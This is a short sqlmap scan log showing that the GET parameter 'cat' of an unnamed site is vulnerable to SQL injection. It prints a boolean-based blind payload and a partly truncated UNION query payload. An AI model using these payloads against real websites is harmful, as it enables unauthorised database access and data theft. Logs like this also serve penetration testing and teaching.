[00:00:02] [INFO] testing if GET parameter 'cat' is dynamic
[00:00:03] [INFO] GET parameter 'cat' appears to be dynamic
[00:00:05] [INFO] GET parameter 'cat' is 'AND boolean-based blind' injectable
sqlmap identified the following injection point(s) with a total of 84 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 1234=1234

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71,...)
---
